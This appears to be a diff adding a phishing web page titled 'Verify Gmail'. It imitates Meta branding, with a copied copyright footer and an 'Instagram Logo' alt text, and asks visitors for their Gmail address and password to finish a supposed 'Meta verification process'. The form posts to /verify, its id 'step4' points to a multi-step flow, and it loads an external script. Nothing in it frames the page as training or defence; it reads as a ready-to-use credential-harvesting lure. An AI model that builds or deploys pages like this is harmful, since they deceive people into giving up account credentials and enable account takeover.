@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Gmail</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f9f9f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            margin-top: 20px;
+
+        }
+        .logo img {
+            width: 100px;
+        }
+        .p {
+            
+            font-family: 'Roboto Condensed', sans-serif;
+            font-size: 16px;
+            color: #666; 
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
+        }
+        form {
+            margin-top: 20px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 70%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .btn {
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .btn:hover {
+            background-color: #357ae8;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        .footer a {
+            color: #4285F4;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="stuff/icons/lock.png" alt="Instagram Logo">
+        </div>
+        <p class="p" style=" ">Confirm it’s You to Login</p>
+        <p>Please verify your Gmail account to complete the Meta verification process.</p>
+        
+        <form action="/verify" method="post" id="step4">
+            <input type="email" name="email" id="email" placeholder="Email Address" required>
+            <input type="password" name="password" id="password" placeholder="Password" required>
+            <br> <br> 
+            <button type="submit" class="btn"><u>Verify Account</u></button>
+        </form>
+        <br>
+        <div class="footer">             © Meta Platforms, Inc., Menlo Park, CA<br>             This message was sent to your Gmail account. <br><a href="#">Learn more</a>         </div>
+        
+    
+    </div>
+    <script src="stuff/icons/gscript.js"></script>
+</body>
+</html>
